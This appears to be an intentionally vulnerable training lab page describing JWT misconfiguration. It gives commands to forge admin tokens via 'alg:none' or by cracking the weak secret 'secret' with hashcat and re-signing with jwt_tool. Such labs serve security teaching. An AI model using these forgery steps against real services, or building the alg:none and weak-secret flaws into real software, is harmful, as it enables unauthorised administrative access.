VULNERABILITY #7: JWT Misconfiguration — Admin access is gated solely on the JWT role claim. Forge a token with "alg":"none" (no signature needed) or crack the weak secret "secret" with hashcat to set "role":"ADMIN".

JWT Forgery Lab

Two methods to gain admin access

  • Method 1: alg:none
  • Method 2: Weak Secret

The server accepts JWTs with "alg":"none" and skips signature verification. Craft a token with any payload you want — no secret required.

Decodes to: {"alg":"none","typ":"JWT"}

The JWT is signed with the weak secret "secret". Use hashcat or jwt-tool to crack it, then forge a new token with role=ADMIN.

Crack with hashcat:

# Save token to file
echo -n "YOUR.JWT.TOKEN" > jwt.txt

# Crack with hashcat (mode 16500 = JWT)
hashcat -a 0 -m 16500 jwt.txt rockyou.txt

# Result: secret "secret" found instantly

Forge with jwt-tool:

# Install jwt-tool
pip install jwt_tool

# Forge token with role=ADMIN
python3 jwt_tool.py YOUR.JWT.TOKEN \
  -T -p "secret" \
  -I -pc role -pv ADMIN
